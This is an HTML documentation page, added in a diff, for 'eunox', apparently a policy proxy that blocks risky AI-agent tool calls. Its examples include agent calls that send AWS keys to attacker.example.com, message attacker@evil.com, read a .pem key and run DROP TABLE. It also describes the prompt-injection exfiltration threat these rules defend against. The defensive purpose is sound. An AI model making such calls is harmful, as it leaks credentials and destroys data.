@@ -1,0 +1,675 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Features · eunox</title>
+  <meta name="description"
+    content="Every guardrail you can attach to a capability — with a worked tool call, the policy that catches it, and the structured outcome the agent receives." />
+  <link rel="icon" href="../eunolabs.png" />
+  <link rel="stylesheet" href="../styles.css" />
+</head>
+
+<body>
+  <div id="site-header"></div>
+  <section class="hero hero-compact">
+    <div class="hero-eyebrow"><span class="dot"></span>Features</div>
+    <h1>Conditions &amp; <em>directives</em></h1>
+    <p class="hero-sub">
+      Every guardrail you can attach to a capability — conditions block before
+      the upstream is contacted, directives apply obligations after an allowed
+      response — with a worked example for each.
+    </p>
+  </section>
+  <nav class="breadcrumbs" aria-label="Breadcrumb">
+    <a href="../index.html">Home</a> &nbsp;›&nbsp; Features
+  </nav>
+  <main class="content-section">
+    <div class="page-toc" aria-label="On this page">
+      <h4>Conditions</h4>
+      <ul>
+        <li><a href="#sequenceBlock">sequenceBlock</a></li>
+        <li><a href="#argumentSchema">argumentSchema</a></li>
+        <li><a href="#allowedValues">allowedValues</a></li>
+        <li><a href="#allowedOperations">allowedOperations</a></li>
+        <li><a href="#allowedExtensions">allowedExtensions</a></li>
+        <li><a href="#allowedTables">allowedTables</a></li>
+        <li><a href="#maxCalls">maxCalls</a></li>
+        <li><a href="#timeWindow">timeWindow</a></li>
+        <li><a href="#ipRange">ipRange</a></li>
+        <li><a href="#recipientDomain">recipientDomain</a></li>
+        <li><a href="#policy">policy (external backends)</a></li>
+        <li><a href="#custom">custom (handler hooks)</a></li>
+      </ul>
+      <h4>Directives</h4>
+      <ul>
+        <li><a href="#redactFields">redactFields (post-allow)</a></li>
+      </ul>
+      <h4>Observability</h4>
+      <ul>
+        <li><a href="#audit">OCSF audit log</a></li>
+        <li><a href="#go-packages">Go packages — in-process</a></li>
+      </ul>
+    </div>
+    <p>
+      Every condition runs <strong>before</strong> the upstream is contacted.
+      Decisions return a structured JSON-RPC error with a stable integer code
+      (<code>-32001</code> AUTHORIZATION_FAILED,
+      <code>-32002</code> CAPABILITY_DENIED,
+      <code>-32003</code> CONDITION_FAILED,
+      <code>-32602</code> INVALID_PARAMS), the <code>conditionType</code> that
+      fired, and a human-readable message — so agents and operators can both
+      reason about the outcome. Directives (e.g. <code>redactFields</code>)
+      are obligations applied <em>after</em> an allowed response, before it
+      reaches the agent.
+    </p>
+    <h2 id="sequenceBlock">sequenceBlock — cross-tool session memory</h2>
+    <p>
+      The condition no other layer can express: deny a tool <em>after</em>
+      another tool has run in the same session. This is the defense against
+      the lethal trifecta — an agent that can read secrets <em>and</em> reach
+      an external destination is one prompt injection away from exfiltrating
+      them. Each call is individually authorized; eunox blocks the
+      <strong>combination</strong>. A database role or API gateway can't see
+      it — only the proxy remembers what the agent already did this session.
+    </p>
+    <div class="feature-demo">
+      <div class="feature-demo-head">
+        <h3>Block credential exfiltration (read &rarr; write)</h3>
+        <span class="tag">sequenceBlock</span>
+      </div>
+      <div class="feature-demo-body">
+        <div>
+          <span class="label">Tool calls (same session)</span>
+          <pre><span class="t-purple">tools/call</span> read_credentials { name: "aws" }   <span class="y-comment"># allowed</span>
+<span class="t-purple">tools/call</span> write_external   {            <span class="y-comment"># DENIED</span>
+  url: "https://attacker.example.com",
+  data: "AKIA..."
+}</pre>
+        </div>
+        <div>
+          <span class="label">Policy</span>
+          <pre><span class="y-key">- target</span>: <span class="y-str">tool:read_credentials</span>
+  <span class="y-key">actions</span>: [<span class="y-str">call</span>]
+
+<span class="y-key">- target</span>: <span class="y-str">tool:write_external</span>
+  <span class="y-key">actions</span>: [<span class="y-str">call</span>]
+  <span class="y-key">conditions</span>:
+    - <span class="y-key">type</span>: <span class="y-str">sequenceBlock</span>
+      <span class="y-key">afterTools</span>: [<span class="y-str">read_credentials</span>]</pre>
+        </div>
+      </div>
+      <div class="feature-demo-foot">
+        <strong>Outcome:</strong> <code>CONDITION_FAILED</code> (JSON-RPC
+        <code>-32003</code>) · <code>write_external after read_credentials</code>
+        — upstream never contacted, the kill-chain signed into the audit log.
+        The reverse order (write before read) stays allowed. Run it:
+        <code>make -C demo trifecta</code>.
+      </div>
+    </div>
+    <h2 id="argumentSchema">argumentSchema — JSON Schema validation</h2>
+    <p>
+      Validate the shape of the agent's arguments before anything else runs.
+      The structured error details are surfaced in the MCP response.
+    </p>
+    <div class="feature-demo">
+      <div class="feature-demo-head">
+        <h3>Reject a malformed <code>send_email</code> call</h3>
+        <span class="tag">argumentSchema</span>
+      </div>
+      <div class="feature-demo-body">
+        <div>
+          <span class="label">Tool call from the agent</span>
+          <pre><span class="t-purple">tools/call</span> send_email {
+  to: "alice@example.com",
+  body: 42                <span class="y-comment"># wrong type</span>
+}</pre>
+        </div>
+        <div>
+          <span class="label">Policy</span>
+          <pre><span class="y-comment"># argumentSchema is a top-level field on the capability constraint,</span>
+<span class="y-comment"># not a `conditions[]` entry. The schema body goes here directly.</span>
+<span class="y-key">- target</span>: <span class="y-str">tool:send_email</span>
+  <span class="y-key">actions</span>: [<span class="y-str">call</span>]
+  <span class="y-key">argumentSchema</span>:
+    <span class="y-key">type</span>: <span class="y-str">object</span>
+    <span class="y-key">required</span>: [<span class="y-str">to</span>, <span class="y-str">body</span>]
+    <span class="y-key">properties</span>:
+      <span class="y-key">to</span>:   { <span class="y-key">type</span>: <span class="y-str">string</span> }
+      <span class="y-key">body</span>: { <span class="y-key">type</span>: <span class="y-str">string</span>, <span class="y-key">maxLength</span>: <span class="y-num">10000</span> }
+    <span class="y-key">additionalProperties</span>: <span class="y-num">false</span></pre>
+        </div>
+      </div>
+      <div class="feature-demo-foot">
+        <strong>Outcome:</strong> <code>INVALID_PARAMS</code> (JSON-RPC
+        <code>-32602</code>) · <code>body must be string</code> — upstream
+        never contacted. <code>argumentSchema</code> runs before any
+        <code>conditions[]</code>; a schema failure always wins.
+      </div>
+    </div>
+    <h2 id="allowedValues">allowedValues — argument value / glob allowlist</h2>
+    <p>
+      The workhorse condition: pin a named argument to a fixed set of scalar
+      values, or to glob patterns. String values match as globs — a single
+      <code>*</code> stays within a path segment, <code>**</code> crosses
+      <code>/</code> — so <code>"/reports/*"</code> admits
+      <code>/reports/q3.pdf</code> but not <code>/internal/keys.pem</code>.
+      This is the condition behind the canonical
+      "<code>read_file</code> only under <code>/reports/</code>" policy.
+    </p>
+    <div class="feature-demo">
+      <div class="feature-demo-head">
+        <h3>Confine <code>read_file</code> to <code>/reports/</code></h3>
+        <span class="tag">allowedValues</span>
+      </div>
+      <div class="feature-demo-body">
+        <div>
+          <span class="label">Tool call</span>
+          <pre><span class="t-purple">tools/call</span> read_file {
+  path: "/internal/keys.pem"
+}</pre>
+        </div>
+        <div>
+          <span class="label">Policy</span>
+          <pre><span class="y-key">- target</span>: <span class="y-str">tool:read_file</span>
+  <span class="y-key">actions</span>: [<span class="y-str">call</span>]
+  <span class="y-key">conditions</span>:
+    - <span class="y-key">type</span>: <span class="y-str">allowedValues</span>
+      <span class="y-key">argument</span>: <span class="y-str">path</span>
+      <span class="y-key">values</span>: [<span class="y-str">"/reports/*"</span>]</pre>
+        </div>
+      </div>
+      <div class="feature-demo-foot">
+        <strong>Outcome:</strong> <code>VALUE_NOT_PERMITTED</code> (JSON-RPC
+        <code>-32003</code>) · <code>/internal/keys.pem ∉ [/reports/*]</code>
+        — upstream never contacted. A missing <code>path</code> argument fails
+        closed with <code>MISSING_CONTEXT</code>; string values match by glob
+        only (never exact-first), so <code>values: ["*"]</code> is the explicit
+        allow-any-string wildcard.
+      </div>
+    </div>
+    <h2 id="allowedOperations">allowedOperations — SQL verb allowlist</h2>
+    <p>
+      The classic database guardrail: only let agents run reads. The first
+      whitespace-separated word of the input is matched against the allowlist.
+    </p>
+    <div class="feature-demo">
+      <div class="feature-demo-head">
+        <h3>Block <code>DROP TABLE</code></h3>
+        <span class="tag">allowedOperations</span>
+      </div>
+      <div class="feature-demo-body">
+        <div>
+          <span class="label">Tool call</span>
+          <pre><span class="t-purple">tools/call</span> query_db {
+  sql: "DROP TABLE users"
+}</pre>
+        </div>
+        <div>
+          <span class="label">Policy</span>
+          <pre><span class="y-key">conditions</span>:
+  - <span class="y-key">type</span>: <span class="y-str">allowedOperations</span>
+    <span class="y-key">argument</span>: <span class="y-str">sql</span>
+    <span class="y-key">operations</span>: [<span class="y-str">SELECT</span>]</pre>
+        </div>
+      </div>
+      <div class="feature-demo-foot">
+        <strong>Outcome:</strong> <code>OPERATION_NOT_PERMITTED</code>
+        (JSON-RPC <code>-32003</code>) ·
+        <code>operation DROP not in [SELECT]</code>. Note this is a
+        <em>first-word</em> guard — pair with <code>argumentSchema</code> for
+        stricter SQL parsing if you need it.
+      </div>
+    </div>
+    <h2 id="allowedExtensions">
+      allowedExtensions — file extension allowlist
+    </h2>
+    <p>
+      Constrain what file types an agent can touch. The required
+      <code>argument</code> field names the path parameter to check (a single
+      path, or an array of paths).
+    </p>
+    <div class="feature-demo">
+      <div class="feature-demo-head">
+        <h3>Block reading a private key</h3>
+        <span class="tag">allowedExtensions</span>
+      </div>
+      <div class="feature-demo-body">
+        <div>
+          <span class="label">Tool call</span>
+          <pre><span class="t-purple">tools/call</span> read_file {
+  path: "/data/keys.pem"
+}</pre>
+        </div>
+        <div>
+          <span class="label">Policy</span>
+          <pre><span class="y-key">conditions</span>:
+  - <span class="y-key">type</span>: <span class="y-str">allowedExtensions</span>
+    <span class="y-key">argument</span>: <span class="y-str">path</span>
+    <span class="y-key">extensions</span>:
+      [<span class="y-str">".csv"</span>, <span class="y-str">".json"</span>, <span class="y-str">".txt"</span>, <span class="y-str">".md"</span>]</pre>
+        </div>
+      </div>
+      <div class="feature-demo-foot">
+        <strong>Outcome:</strong> <code>CONDITION_FAILED</code> (JSON-RPC
+        <code>-32003</code>, conditionType <code>allowedExtensions</code>) ·
+        <code>.pem ∉ allowedExtensions</code>.
+      </div>
+    </div>
+    <h2 id="allowedTables">allowedTables — database table allowlist</h2>
+    <p>
+      Restrict which tables an agent can read or write to. The required
+      <code>argument</code> field names the parameter carrying the table
+      name(s) — a string, an array, or a <code>{table, columns}</code> object.
+    </p>
+    <div class="feature-demo">
+      <div class="feature-demo-head">
+        <h3>Block writes to <code>credentials</code></h3>
+        <span class="tag">allowedTables</span>
+      </div>
+      <div class="feature-demo-body">
+        <div>
+          <span class="label">Tool call</span>
+          <pre><span class="t-purple">tools/call</span> insert_row {
+  table: "credentials",
+  row: { ... }
+}</pre>
+        </div>
+        <div>
+          <span class="label">Policy</span>
+          <pre><span class="y-key">conditions</span>:
+  - <span class="y-key">type</span>: <span class="y-str">allowedTables</span>
+    <span class="y-key">argument</span>: <span class="y-str">table</span>
+    <span class="y-key">tables</span>:
+      [<span class="y-str">orders</span>, <span class="y-str">customers</span>, <span class="y-str">products</span>]</pre>
+        </div>
+      </div>
+      <div class="feature-demo-foot">
+        <strong>Outcome:</strong> <code>CONDITION_FAILED</code> (JSON-RPC
+        <code>-32003</code>, conditionType <code>allowedTables</code>) ·
+        <code>credentials ∉ allowedTables</code>.
+      </div>
+    </div>
+    <h2 id="maxCalls">maxCalls — per-session rate limit</h2>
+    <p>
+      Stop a runaway agent from making thousands of writes in a tight loop.
+      Counter resets when the window expires.
+    </p>
+    <div class="feature-demo">
+      <div class="feature-demo-head">
+        <h3>Cap GitHub write tools</h3>
+        <span class="tag">maxCalls</span>
+      </div>
+      <div class="feature-demo-body">
+        <div>
+          <span class="label">Tool calls</span>
+          <pre><span class="t-purple">tools/call</span> create_issue { ... }   <span class="t-ok">✓ 1/10</span>
+<span class="t-purple">tools/call</span> create_issue { ... }   <span class="t-ok">✓ 2/10</span>
+   ...
+<span class="t-purple">tools/call</span> create_issue { ... }   <span class="t-ok">✓ 10/10</span>
+<span class="t-purple">tools/call</span> create_issue { ... }   <span class="t-err">✗ rate limited</span></pre>
+        </div>
+        <div>
+          <span class="label">Policy</span>
+          <pre><span class="y-key">conditions</span>:
+  - <span class="y-key">type</span>: <span class="y-str">maxCalls</span>
+    <span class="y-key">count</span>: <span class="y-num">10</span>
+    <span class="y-key">windowSeconds</span>: <span class="y-num">60</span></pre>
+        </div>
+      </div>
+      <div class="feature-demo-foot">
+        <strong>Outcome:</strong> <code>RATE_LIMITED</code> (JSON-RPC
+        <code>-32003</code>) · <code>10 calls/60s exhausted</code>.
+      </div>
+    </div>
+    <h2 id="timeWindow">timeWindow — wall-clock gate</h2>
+    <p>
+      <code>notBefore</code> / <code>notAfter</code> for time-bound
+      capabilities (e.g. a maintenance window).
+    </p>
+    <div class="feature-demo">
+      <div class="feature-demo-head">
+        <h3>Only during the maintenance window</h3>
+        <span class="tag">timeWindow</span>
+      </div>
+      <div class="feature-demo-body">
+        <div>
+          <span class="label">Tool call (at 09:15)</span>
+          <pre><span class="t-purple">tools/call</span> truncate_logs { ... }</pre>
+        </div>
+        <div>
+          <span class="label">Policy</span>
+          <pre><span class="y-key">conditions</span>:
+  - <span class="y-key">type</span>: <span class="y-str">timeWindow</span>
+    <span class="y-key">notBefore</span>: <span class="y-str">"2026-05-09T01:00:00Z"</span>
+    <span class="y-key">notAfter</span>:  <span class="y-str">"2026-05-09T03:00:00Z"</span></pre>
+        </div>
+      </div>
+      <div class="feature-demo-foot">
+        <strong>Outcome:</strong> <code>CONDITION_FAILED</code> (JSON-RPC
+        <code>-32003</code>, conditionType <code>timeWindow</code>) ·
+        <code>now=09:15 not in [01:00, 03:00]</code>.
+      </div>
+    </div>
+    <h2 id="ipRange">ipRange — source-IP CIDR allowlist</h2>
+    <p>
+      HTTP transport only — stdio sessions have no source IP. Useful for
+      caller-network controls in shared environments.
+    </p>
+    <div class="feature-demo">
+      <div class="feature-demo-head">
+        <h3>Lock a tool to corp egress</h3>
+        <span class="tag">ipRange</span>
+      </div>
+      <div class="feature-demo-body">
+        <div>
+          <span class="label">Tool call (over HTTP)</span>
+          <pre><span class="t-info">sourceIp</span>: 203.0.113.7
+<span class="t-purple">tools/call</span> rotate_token { ... }</pre>
+        </div>
+        <div>
+          <span class="label">Policy</span>
+          <pre><span class="y-key">conditions</span>:
+  - <span class="y-key">type</span>: <span class="y-str">ipRange</span>
+    <span class="y-key">cidrs</span>: [<span class="y-str">"10.0.0.0/8"</span>, <span class="y-str">"192.168.0.0/16"</span>]</pre>
+        </div>
+      </div>
+      <div class="feature-demo-foot">
+        <strong>Outcome:</strong> <code>CONDITION_FAILED</code> (JSON-RPC
+        <code>-32003</code>, conditionType <code>ipRange</code>). With a stdio
+        session there is no source IP, so the same condition fails closed with
+        <code>MISSING_CONTEXT</code> — reason
+        <em>"ipRange requires sourceIp in request context"</em>.
+      </div>
+    </div>
+    <h2 id="recipientDomain">recipientDomain — email / handle allowlist</h2>
+    <p>
+      Stop accidental data exfiltration over messaging tools. The required
+      <code>argument</code> field names the recipient parameter to check — a
+      string or an array of strings.
+    </p>
+    <div class="feature-demo">
+      <div class="feature-demo-head">
+        <h3>Slack DM only to your domain</h3>
+        <span class="tag">recipientDomain</span>
+      </div>
+      <div class="feature-demo-body">
+        <div>
+          <span class="label">Tool call</span>
+          <pre><span class="t-purple">tools/call</span> send_message {
+  to:   "attacker@evil.com",
+  text: "..."
+}</pre>
+        </div>
+        <div>
+          <span class="label">Policy</span>
+          <pre><span class="y-key">conditions</span>:
+  - <span class="y-key">type</span>: <span class="y-str">recipientDomain</span>
+    <span class="y-key">argument</span>: <span class="y-str">to</span>
+    <span class="y-key">domains</span>: [<span class="y-str">company.com</span>]</pre>
+        </div>
+      </div>
+      <div class="feature-demo-foot">
+        <strong>Outcome:</strong> <code>CONDITION_FAILED</code> (JSON-RPC
+        <code>-32003</code>, conditionType <code>recipientDomain</code>) ·
+        <code>evil.com ∉ allowlist</code>.
+      </div>
+    </div>
+    <h2 id="redactFields">redactFields — mask fields in upstream responses</h2>
+    <p>
+      A post-allow directive: the call is allowed, but the named JSON paths
+      are masked in the upstream response — each value replaced with
+      <code>"[redacted]"</code>, the key kept — before the agent sees it.
+      <code>redactFields</code> lives in a top-level
+      <code>directives[]</code> array on the constraint —
+      <strong>not</strong> inside <code>conditions[]</code>. An unparseable
+      upstream response is never returned unredacted; a sanitized error is
+      sent to the caller instead.
+    </p>
+    <div class="feature-demo">
+      <div class="feature-demo-head">
+        <h3>Hide PII from query results</h3>
+        <span class="tag">redactFields</span>
+      </div>
+      <div class="feature-demo-body">
+        <div>
+          <span class="label">Upstream response</span>
+          <pre>
+{
+  "rows": [
+    {   "id": 1,
+      "email": "alice@example.com",
+      "ssn": "123-45-6789" },
+    ...
+  ]
+}</pre>
+        </div>
+        <div>
+          <span class="label">Policy</span>
+          <pre><span class="y-key">- target</span>: <span class="y-str">tool:query_db</span>
+  <span class="y-key">actions</span>: [<span class="y-str">call</span>]
+  <span class="y-comment"># directives run after an allowed response</span>
+  <span class="y-key">directives</span>:
+    - <span class="y-key">type</span>: <span class="y-str">redactFields</span>
+      <span class="y-key">fields</span>:
+        [<span class="y-str">"rows.ssn"</span>,
+         <span class="y-str">"rows.email"</span>]</pre>
+        </div>
+      </div>
+      <div class="feature-demo-foot">
+        <strong>Outcome:</strong> response forwarded with the named
+        dotted-path fields replaced by <code>"[redacted]"</code> (recursively
+        into array elements); the original is never seen by the agent. A field
+        absent from the response is a no-op.
+      </div>
+    </div>
+    <h2 id="policy">policy — delegate to an external engine (Go SDK)</h2>
+    <p>
+      Plug in OPA, Cedar, an authorization service, or any sidecar. Implement
+      <code>enforcement.PolicyEvaluator</code> and wire it into the engine at
+      construction time. Available via <code>pkg/enforcement</code> for
+      in-process Go services.
+    </p>
+    <div class="feature-demo">
+      <div class="feature-demo-head">
+        <h3>OPA-backed authorization</h3>
+        <span class="tag">policy</span>
+      </div>
+      <div class="feature-demo-body">
+        <div>
+          <span class="label">Go evaluator</span>
+          <pre><span class="y-comment">// implement enforcement.PolicyEvaluator</span>
+type OPAEvaluator struct { Path string }
+
+func (o *OPAEvaluator) Evaluate(
+  ctx context.Context,
+  cfg map[string]any,
+  req *capability.EnforceRequest,
+) (*enforcement.PolicyResult, error) {
+  ok, err := opa.Eval(o.Path, req)
+  if !ok {
+    return &enforcement.PolicyResult{
+      Allow: false, Reason: "opa: denied",
+    }, err
+  }
+  return &enforcement.PolicyResult{Allow: true}, nil
+}</pre>
+        </div>
+        <div>
+          <span class="label">Policy + wiring</span>
+          <pre><span class="y-comment"># eunox.policy.yaml</span>
+<span class="y-key">conditions</span>:
+  - <span class="y-key">type</span>: <span class="y-str">policy</span>
+    <span class="y-key">backend</span>: <span class="y-str">opa</span>
+    <span class="y-key">config</span>:
+      <span class="y-key">path</span>: <span class="y-str">data.tools.allow</span>
+
+<span class="y-comment">// wire in Go</span>
+engine := enforcement.New(
+  enforcement.WithPolicyEvaluator(
+    &OPAEvaluator{Path: "data.tools.allow"},
+  ),
+)</pre>
+        </div>
+      </div>
+      <div class="feature-demo-foot">
+        <strong>Outcome:</strong> the engine delegates the decision to your
+        evaluator; a missing or panicking evaluator fails closed — the call is
+        denied.
+      </div>
+    </div>
+    <h2 id="custom">custom — register your own condition types (Go SDK)</h2>
+    <p>
+      Need something specific to your domain? Implement
+      <code>enforcement.ConditionHandler</code> and register it with the
+      engine by name. Any policy entry with <code>type: custom</code> and a
+      matching <code>name</code> resolves to your handler.
+    </p>
+    <div class="feature-demo">
+      <div class="feature-demo-head">
+        <h3>Block recipients on a deny-list</h3>
+        <span class="tag">custom</span>
+      </div>
+      <div class="feature-demo-body">
+        <div>
+          <span class="label">Go handler</span>
+          <pre>enforcement.New(
+  enforcement.WithConditionHandler(
+    capability.ConditionTypeCustom,
+    enforcement.ConditionHandlerFunc(
+      func(ctx context.Context,
+        cond capability.Condition,
+        req *capability.EnforceRequest,
+      ) *enforcement.ConditionError {
+        cc := cond.(*capability.CustomCondition)
+        if cc.Name == "denyBlockedRecipient" &&
+          BLOCKLIST.Has(req.Arguments["to"]) {
+          return &enforcement.ConditionError{
+            Code:    "RECIPIENT_BLOCKED",
+            Message: "recipient blocked",
+          }
+        }
+        return nil <span class="y-comment">// allow</span>
+      },
+    ),
+  ),
+)</pre>
+        </div>
+        <div>
+          <span class="label">Policy</span>
+          <pre><span class="y-key">conditions</span>:
+  - <span class="y-key">type</span>: <span class="y-str">custom</span>
+    <span class="y-key">name</span>: <span class="y-str">denyBlockedRecipient</span>
+    <span class="y-key">config</span>: {}</pre>
+        </div>
+      </div>
+      <div class="feature-demo-foot">
+        <strong>Outcome:</strong> handler-defined deny code surfaces in the
+        OCSF audit log alongside built-in conditions. Missing handler →
+        fail-closed deny.
+      </div>
+    </div>
+    <h2 id="audit">OCSF audit log</h2>
+    <p>
+      Every decision is recorded as an OCSF API Activity event (class_uid
+      <code>6003</code>), HMAC-SHA256-signed with a key under
+      <code>~/.eunox/audit.key</code> (mode <code>0600</code>). The log lives at
+      <code>~/.eunox/audit.jsonl</code> and rotates at 100 MiB; rotated files
+      are named <code>audit.jsonl.&lt;ISO-timestamp&gt;</code>.
+    </p>
+    <p>
+      In <a href="../how-it-works/index.html#gateway">gateway mode</a>, each
+      record is additionally stamped with the handling <code>upstream</code>,
+      the in-force <code>policy_version</code>, and a <code>policy_sha256</code>
+      digest — so one shared tape proves <em>which policy version of which
+        upstream</em> decided each call.
+    </p>
+    <div class="feature-demo">
+      <div class="feature-demo-head">
+        <h3>Inspect & verify</h3>
+        <span class="tag">audit</span>
+      </div>
+      <div class="feature-demo-body">
+        <div>
+          <span class="label">Tail and aggregate</span>
+          <pre>
+$ tail -F ~/.eunox/audit.jsonl | jq
+
+$ eunox stats
+denial histogram (since rotation):
+  allowedExtensions       12 ███████
+  allowedOperations        7 ████
+  recipientDomain          3 ██
+  argumentSchema           1 █</pre>
+        </div>
+        <div>
+          <span class="label">Sample event</span>
+          <pre>
+{
+  "class_uid": 6003,
+  "metadata": {
+    "uid": "ev-7b…",
+    "version": "1.4.0"
+  },
+  "activity_id": 2,
+  "status_id": 2,
+  "api": { "operation":
+    "tools/call:read_file" },
+  "src_endpoint": { "ip": "stdio" },
+  "raw_data": "&lt;canonical-json&gt;",
+  "signature": "&lt;hmac-sha256&gt;"
+}</pre>
+        </div>
+      </div>
+      <div class="feature-demo-foot">
+        <strong>Verify:</strong> <code>verifyAuditEvent()</code> recomputes
+        <code>HMAC(key, SHA-256(canonical-json))</code> for round-trip
+        integrity checks.
+      </div>
+    </div>
+    <h2 id="go-packages">Go packages — same enforcement, in-process</h2>
+    <p>
+      All Apache-2.0. Services can evaluate manifests without shelling out to
+      a separate proxy process.
+    </p>
+    <ul>
+      <li>
+        <a href="https://github.com/eunolabs/eunox/tree/main/pkg/capability" target="_blank"
+          rel="noopener noreferrer"><code>pkg/capability</code></a>
+        — manifest and condition types.
+      </li>
+      <li>
+        <a href="https://github.com/eunolabs/eunox/tree/main/pkg/enforcement" target="_blank"
+          rel="noopener noreferrer"><code>pkg/enforcement</code></a>
+        — enforcement engine and decision flow.
+      </li>
+      <li>
+        <a href="https://github.com/eunolabs/eunox/tree/main/pkg/callcounter" target="_blank"
+          rel="noopener noreferrer"><code>pkg/callcounter</code></a>
+        — per-session call counters for <code>maxCalls</code>.
+      </li>
+    </ul>
+    <p>
+      If a service evaluates a manifest that only allows <code>SELECT</code>,
+      the same <code>OPERATION_NOT_PERMITTED</code> decision is raised before
+      any database call is made.
+    </p>
+    <div class="callout">
+      <strong>Schema parity.</strong> The manifest format follows the
+      <a href="https://github.com/eunolabs/mcp-capability-manifest/blob/main/SPEC.md" target="_blank"
+        rel="noopener noreferrer">MCP Capability Manifest Specification</a>. The policy file is shared across
+      <code>eunox</code>,
+      <code>pkg/capability</code>, and <code>pkg/enforcement</code> — exactly
+      one shape, zero drift between the proxy and the rest of the system.
+    </div>
+    <p style="margin-top: 32px">
+      <a href="../quickstart/index.html" class="btn-primary" style="text-decoration: none">Try it in 60 seconds →</a>
+    </p>
+  </main>
+  <div id="site-footer"></div>
+  <script src="../components.js"></script>
+  <script src="../main.js"></script>
+</body>
+
+</html>
